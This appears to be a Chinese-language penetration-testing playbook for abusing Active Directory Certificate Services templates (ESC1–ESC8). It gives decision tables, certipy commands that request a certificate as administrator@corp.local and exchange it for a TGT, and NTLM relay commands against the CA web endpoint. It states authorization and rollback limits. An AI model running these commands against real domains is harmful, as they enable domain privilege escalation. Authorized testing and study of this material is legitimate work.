# ADCS ESC 判据：从 find 到 auth（adcs-esc-decision）

> 入口信号：域内有 CA、`certipy find -vulnerable` 列出模板、或拿到 `CA`/`Template` 名称。
> 目标：把“模板看起来可打”变成“有 pfx 且 `certipy auth` 出 TGT”的可复现结论。
> 配套：`references/kerberos-and-adcs.md`、`references/05-delegation-and-rbcd.md`、`scripts/ad-repro.py`。

## 1. 先只读枚举

```bash
export DOMAIN='corp.local' DC='10.0.0.10' USER='alice' PASS='<pass>'
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -vulnerable -stdout
# 只看：模板名、Enroll 权限、SAN 限制、EKU、manager approval、CA flag、HTTP 端点
```

离线记录一张表（不要只留截图）：

| 字段 | 取值 | 为什么重要 |
| :-- | :-- | :-- |
| `enroll_allowed` | 当前主体是否有 Enroll | 没有就直接 blocked |
| `san_enforced` | 是否强制 SAN/ subject | ESC1 要求可自定 SAN |
| `client_auth_eku` | Client Auth / Smart Card Logon | 没有客户端 EKU 的证书不能 PKINIT |
| `manager_approval` | 是否需要审批 | 需要审批则 ESC1/ESC2 不成立 |
| `ca_san_allowed` | CA 是否允许请求者提供 subject | ESC6 相关 |
| `acl_writable` | 模板对象 ACL 是否可写 | ESC4 |
| `http_endpoint` | CA Web Enrollment/NDES | ESC8 relay |
| `ntlm_relay_allowed` | EPA/signing 是否放行 | ESC8 的前提 |

## 2. ESC 分支判据

| ESC | 成立条件（全部满足） | 成功证据 | 常见失败 |
| :-- | :-- | :-- | :-- |
| ESC1 | 可 Enroll；SAN 不强制；客户端 EKU；无需审批；CA 允许 SAN | `certipy req` 得到 pfx + `certipy auth` 出 TGT | 需审批/CA 拒绝 SAN/无 Enroll |
| ESC2 | 可 Enroll；Any Purpose EKU；无需审批 | pfx + auth 出 TGT | 模板只允许特定用途 |
| ESC3 | 可 Enroll 注册代理模板；可代目标请求 | 代理证书 + 目标证书 + auth | 代理模板需审批/目标模板限制 |
| ESC4 | 对模板对象有写权限；改后能注册 | ACL 修改 + 新证书 + auth | 有写权限但审计/回滚；模板被保护 |
| ESC6 | CA 允许 EDITF_ATTRIBUTESUBJECTALTNAME2 | 请求任意 SAN + auth | flag 未开/CA 拒绝 |
| ESC7 | 对 CA 有 ManageCA/ManageCertificates | 改 CA 权限/签发 + auth | 权限不足/需要重启 CA |
| ESC8 | CA HTTP 端点可达；目标可强制认证；EPA/signing 未拦 | relay 收到证书 + auth | signing/EPA 已开；只 relay 到 LDAP |

## 3. 一次最小验证

```bash
# 1) 请求（只对授权模板；UPN/SAN 用测试值）
certipy req -u "$USER@$DOMAIN" -p "$PASS" -ca '<CA>' -template '<Tpl>' \
  -upn 'administrator@corp.local' -dc-ip "$DC"
# 2) 立即验证证书是否真能换 TGT
certipy auth -pfx administrator.pfx -dc-ip "$DC"
# 3) 记录 TGT/ccache 指纹与有效期（不回传明文）
```

判据：第 2 步返回 TGT/ccache，且能用它访问一个只读目标（`klist`/`smbclient`/`whoami`）。
只有 pfx 没有 auth 成功 = 素材，不是打穿。

## 4. ESC8 / relay 的额外前提

```bash
# 先确认 signing/EPA；不要先开 relay
nxc smb <target> -u '' -p '' --gen-relay-list relay.txt
certipy relay -ca '<CA>' -template '<Tpl>'
# 或
impacket-ntlmrelayx -t 'http://<CA>/certsrv/certfnsh.asp' -smb2support --adcs
```

失败判据：SMB/LDAP signing 强制、EPA 已开、目标只收 Kerberos、CA 端点只允许特定模板。
看到这些就停 relay，转凭据直连/其他 ESC。

## 5. 离线复算

把 `certipy find` 的关键字段写成 JSON，交给 `ad-repro.py`：

```bash
python Tool/skill/ad-cloud/scripts/ad-repro.py --kind adcs --input adcs.json
```

输入示例（只放判定字段，不放证书/私钥）：

```json
{"kind":"adcs","templates":[
  {"name":"CorpWeb","enroll_allowed":true,"san_enforced":false,
   "client_auth_eku":true,"manager_approval":false,"ca_san_allowed":true}
]}
```

输出只会在 `auth_succeeded=true` 时给 `confirmed`；否则是 `candidate`，并列出 blocker。

## 6. 失败判据

- find 报 vulnerable，但当前账号无 Enroll → 转 ESC4/ESC5/ESC7，不再试 ESC1。
- 模板需 manager approval 或 CA 拒绝 SAN → ESC1/ESC6 不成立。
- pfx 拿到但 auth 失败 → 查 EKU/UPN/DC 时间/证书链；换模板。
- ESC8 端点存在但 relay 收不到认证 → 查 signing/EPA，停 relay。
- 反复 req/auth 会刷 4886/4887/4768；控制频率并记录时间。

## 7. 边界

- 只对授权域/CA/模板操作；修改模板/CA 权限必须单独授权、备份、登记回滚。
- 不导出/回传私钥、pfx 明文；只留指纹、有效期、用途。
- 不把“模板属性”写成“已提权”；没有 TGT/服务访问就没有 confirmed。
- ADCS 之外的应用层/Web 漏洞不在本页范围。
